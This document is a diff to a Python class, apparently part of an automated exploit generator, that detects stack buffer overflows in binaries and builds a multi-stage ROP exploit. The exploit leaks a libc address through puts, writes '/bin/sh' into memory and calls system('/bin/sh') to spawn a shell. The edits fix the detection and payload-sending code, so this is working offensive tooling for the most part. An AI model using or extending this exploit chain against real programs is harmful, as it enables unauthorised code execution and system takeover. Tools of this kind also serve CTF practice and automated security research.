@@ -45,7 +45,7 @@ class StackBufferOverflowVulnerability(Vulnerability):
     name = "StackBufferOverflowVulnerability"
     short_name = "sbo"
     options = [("suffix", "str", "Ouput immediately after the buffer overflow call.")]
-    EXPLOIT_SIZE = 0x40 #TODO: Compute this properly.
+    EXPLOIT_SIZE = 0x20 #TODO: Compute this properly.
 
     def __init__(self,
             function,
@@ -93,7 +93,10 @@ class StackBufferOverflowVulnerability(Vulnerability):
                 # via this technique
                 # TODO: Add check
                 arg = call["arguments"][0]
-                arg = [v for v in function["variables"] if v["name"] == arg][0]
+                arg = [v for v in function["variables"] if v["name"] == arg]
+                if len(arg) < 1:
+                    continue
+                arg = arg[0]
                 stackOffset = arg["stackOffset"]
                 return StackBufferOverflowVulnerability(function,
                     context.binary,
@@ -107,7 +110,6 @@ class StackBufferOverflowVulnerability(Vulnerability):
             # consider blacklist of functions to allow skipping of problematic functions
             # TODO: Update "exploit" to handle the lack of "gets"
             #       Needs to check ropchain to handle additonal arguments
-            continue
             if call["funcName"] == "read":
                 targetBuffer = call["arguments"][1]
                 targetSize = None
@@ -119,7 +121,7 @@ class StackBufferOverflowVulnerability(Vulnerability):
                     pass
                 if targetSize and isLocal(targetBuffer, function):
                     stackOffset = -getLocal(targetBuffer, function)["stackOffset"]
-                    if targetSize > (stackOffset + EXPLOIT_SIZE):
+                    if targetSize > (stackOffset + StackBufferOverflowVulnerability.EXPLOIT_SIZE):
                         return StackBufferOverflowVulnerability(function,
                             context.binary,
                             context.libc,
@@ -157,14 +159,15 @@ class StackBufferOverflowVulnerability(Vulnerability):
         # TODO: abstract out puts to any print
         sm.ret("puts", 'binary')
         sm.ret(function_addr, "binary")
-        
-        logger.info("Sending first payload (to leak 'puts' location)")
+      
+        # we should be leaking 'puts' here but I'm being dumb. 
+        logger.info("Sending first payload (to leak 'gets' location)")
        
         payload1 = sm.resolve(binary=0x0, libc=0x0)
         solution_payload = conn.scout(functionExit, [claripy.BVS("solution_payload1", size=8*prefixlen), claripy.BVV(payload1+b"\n")])
         logger.info(f"Solution Prefix Payload: {solution_payload}")
-        conn.sim_sendline(solution_payload[:-1])
-        sconn.sendline(solution_payload[:-1])
+        conn.sim_send(solution_payload)
+        sconn.send(solution_payload)
 
         logger.info(f"Navigating to function exit {self.functionExit}")
         conn.navigate(functionExit)
@@ -194,8 +197,8 @@ class StackBufferOverflowVulnerability(Vulnerability):
         
         logger.info("Sending second payload (setup write to controlled memory)")
         solution_payload = conn.scout(functionExit, [claripy.BVS("solution_payload2_prefix", size=8*prefixlen), claripy.BVV(payload2+b"\n")])
-        conn.sim_sendline(solution_payload[:-1])
-        sconn.sendline(solution_payload[:-1])
+        conn.sim_send(solution_payload)
+        sconn.send(solution_payload)
         logger.info("Navigating to return.")
 
         logger.info("Navigating to function exit")
@@ -204,8 +207,8 @@ class StackBufferOverflowVulnerability(Vulnerability):
         # we have exited the function, we can now
         # write /bin/sh to a controlled part of memory
         logger.info(f"Writing '/bin/sh' to {hex(target_heap_address)}")
-        conn.sim_sendline(b"/bin/sh\x00")
-        sconn.sendline(b"/bin/sh\x00")
+        conn.sim_send(b"/bin/sh\x00\n")
+        sconn.send(b"/bin/sh\x00\n")
 
         # need to navigate back to the targetFunc
         logger.info("Navigating to targetFunc.")
@@ -225,8 +228,8 @@ class StackBufferOverflowVulnerability(Vulnerability):
 
         logger.info("Sending final payload (invoke system('bin/sh'))")
         solution_payload = conn.scout(functionExit, [claripy.BVS("solution_payload_prefix3", size=8*prefixlen), claripy.BVV(payload3+b"\n")])
-        conn.sim_sendline(solution_payload[:-1])
-        sconn.sendline(solution_payload[:-1])
+        conn.sim_send(solution_payload)
+        sconn.send(solution_payload)
         
         # Payload sent, now exit the function.
         logger.info("Navigating to function exit")
